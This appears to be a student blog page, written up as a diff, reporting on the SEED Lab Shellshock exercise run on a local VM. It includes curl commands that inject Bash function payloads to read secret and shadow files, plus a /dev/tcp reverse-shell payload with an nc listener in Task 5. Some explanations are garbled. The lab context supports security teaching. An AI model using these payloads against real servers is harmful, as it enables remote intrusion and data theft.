@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    Shellshock | Simon&#39;s Blog
+  </title>
+  <meta name="description" content="I am the storm.">
+  
+  <meta name="keywords" content="
+  SEED Lab,Shellshock
+  ">
+  
+  <meta name="author" content="Simon Nie">
+
+  <meta http-equiv="Cache-Control" content="no-transform"/>
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="https://github.githubassets.com/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet"
+        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">Google Search</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        
+        <li><a href="/categories">Categories</a></li>
+        
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+        <li class="desktop-only"><a href="/atom.xml" target="_blank">RSS</a></li>
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.jpg"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 23 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 101 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 9 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">Simon&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    Simon Nie
+
+    <span class="post-date float-right" title="{{moment(1582601696000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1582601696000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>Shellshock</h1>
+    <p><img src="Shellshock/Platform-SEEDUbuntu16__04--32bit-green.svg" alt="">  <img src="Shellshock/SEED-SoftwareSecurityLab-brightgreen.svg" alt=""></p>
+<blockquote>
+<p>This is report of SEED Lab report.</p>
+</blockquote>
+<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
+<li><a href="#task-1-experimenting-with-bash-function">Task 1: Experimenting with Bash Function</a></li>
+<li><a href="#task-2-setting-up-cgi-programs">Task 2: Setting up CGI programs</a></li>
+<li><a href="#task-3-passing-data-to-bash-via-environment-variable">Task 3: Passing Data to Bash via Environment Variable</a></li>
+<li><a href="#task-4-launching-the-shellshock-attack">Task 4: Launching the Shellshock Attack</a></li>
+<li><a href="#task-5-getting-a-reverse-shell-via-shellshock-attack">Task 5: Getting a Reverse Shell via Shellshock Attack</a></li>
+<li><a href="#task-6-using-the-patched-bash">Task 6: Using the Patched Bash</a></li>
+</ul>
+<h2 id="Task-1-Experimenting-with-Bash-Function"><a href="#Task-1-Experimenting-with-Bash-Function" class="headerlink" title="Task 1: Experimenting with Bash Function"></a>Task 1: Experimenting with Bash Function</h2><p>For this task, we need to run  a prepared shell (ubuntu16 has fixed this bug):</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash_shellshock</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-2-Setting-up-CGI-programs"><a href="#Task-2-Setting-up-CGI-programs" class="headerlink" title="Task 2: Setting up CGI programs"></a>Task 2: Setting up CGI programs</h2><p>In this lab, we will launch a Shellshock attack on a remote web server. Many web servers enable CGI, which is a standard method used to generate dynamic content on Web pages and Web applications. Many CGI programs are written using shell scripts. Therefore, before a CGI program is executed, a shell program will  be invoked first, and such an invocation is triggered by a user from a remote computer. If the shell program is a vulnerable Bash program, we can exploit the Shellshock vulnerable to gain privileges on the server.</p>
+<p>create <code>myproc.cgi</code>:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch myprog.cgi</span></span><br></pre></td></tr></table></figure>
+
+<p>fill it with:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash_shellshock </span></span><br><span class="line">echo "Content-type: text/plain"</span><br><span class="line">echo</span><br><span class="line">echo</span><br><span class="line">echo "Hello World"</span><br></pre></td></tr></table></figure>
+
+<p>move it to <code>/usr/lib/cgi-bin</code> and set its permission to 755:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 755 myproc.cgi</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-3-Passing-Data-to-Bash-via-Environment-Variable"><a href="#Task-3-Passing-Data-to-Bash-via-Environment-Variable" class="headerlink" title="Task 3: Passing Data to Bash via Environment Variable"></a>Task 3: Passing Data to Bash via Environment Variable</h2><p>we can use <code>curl -A &quot;info&quot; url</code> to passing data to bash.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[02/25/20]seed@VM:.../cgi-bin$  curl -A "hello" http://localhost/cgi-bin/show.cgi</span><br><span class="line">****** Environment Variables ******</span><br><span class="line">HTTP_HOST=localhost</span><br><span class="line">HTTP_USER_AGENT=hello</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at localhost Port 80&lt;/address&gt;</span><br><span class="line">SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)</span><br><span class="line">SERVER_NAME=localhost</span><br><span class="line">SERVER_ADDR=127.0.0.1</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">REMOTE_ADDR=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/var/www/html</span><br><span class="line">REQUEST_SCHEME=http</span><br><span class="line">CONTEXT_PREFIX=/cgi-bin/</span><br><span class="line">CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/</span><br><span class="line">SERVER_ADMIN=webmaster@localhost</span><br><span class="line">SCRIPT_FILENAME=/usr/lib/cgi-bin/show.cgi</span><br><span class="line">REMOTE_PORT=34124</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">QUERY_STRING=</span><br><span class="line">REQUEST_URI=/cgi-bin/show.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/show.cgi</span><br><span class="line">[02/25/20]seed@VM:.../cgi-bin$</span><br></pre></td></tr></table></figure>
+
+<p>Then we can find that data “hello” has been sent to <code>HTTP_USER_AGENT</code></p>
+<h2 id="Task-4-Launching-the-Shellshock-Attack"><a href="#Task-4-Launching-the-Shellshock-Attack" class="headerlink" title="Task 4: Launching the Shellshock Attack"></a>Task 4: Launching the Shellshock Attack</h2><p>Our target is to leak the info in <code>/tmp/secret.txt</code>，which has been created manually before.</p>
+<p>If we want to look up some info in a file locally, usually we will use “cat xxx” command.</p>
+<p>So our solution is trying to send such command to server and let the server shell execute that command.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -A <span class="string">"() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat</span></span></span><br><span class="line">/tmp/secret.txt" http://localhost/cgi-bin/show.cgi</span><br></pre></td></tr></table></figure>
+
+<p>Here i have tried so many times but i don’t know why it cannot succeed. </p>
+<p>• Using the Shellshock attack to steal the content of a secret file from the server.</p>
+<p>• Answer the following question: will you be able to steal the content of the shadow file <code>/etc/shadow</code>? Why or why not?</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -A <span class="string">"() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/shadow"</span> http://localhost/cgi-bin/show.cgi</span></span><br></pre></td></tr></table></figure>
+
+<p>we cannot steal the content of the shadow file. Because Apache is running with a www-data account, and its cannot access <code>etc\shadow</code> of descriptor 620 . So our attack would fail.</p>
+<h2 id="Task-5-Getting-a-Reverse-Shell-via-Shellshock-Attack"><a href="#Task-5-Getting-a-Reverse-Shell-via-Shellshock-Attack" class="headerlink" title="Task 5: Getting a Reverse Shell via Shellshock Attack"></a>Task 5: Getting a Reverse Shell via Shellshock Attack</h2><p>First, we need listen on the port 9090 (like the lab we have done before.)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc -l 9090 -v</span></span><br></pre></td></tr></table></figure>
+
+<p>And then we need construct a malicious code:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -A <span class="string">"() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/bash -i &gt;</span></span></span><br><span class="line">/dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1" http://localhost/cgi-bin/show.cgi</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task-6-Using-the-Patched-Bash"><a href="#Task-6-Using-the-Patched-Bash" class="headerlink" title="Task 6: Using the Patched Bash"></a>Task 6: Using the Patched Bash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo "Content-type: text/plain"</span><br><span class="line">echo</span><br><span class="line">echo "****** Environment Variables ******"</span><br><span class="line">strings /proc/$$/environ</span><br></pre></td></tr></table></figure>
+
+<p>Then we try to steal the contents.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -A <span class="string">"() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat</span></span></span><br><span class="line">/tmp/secret.txt" http://localhost/cgi-bin/task6.cgi</span><br></pre></td></tr></table></figure>
+
+<p>We will failed in a new bash.</p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="http://simonnie98.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 Simon Nie</li>
+      <li><a href="http://simonnie98.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/SimonNie98" target="_blank" rel="noopener">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica" target="_blank" rel="noopener">Replica</a>
+      by <a href="//github.com/sabrinaluo" target="_blank" rel="noopener">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '001135385136731589458:hwqr0dnpaxv';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
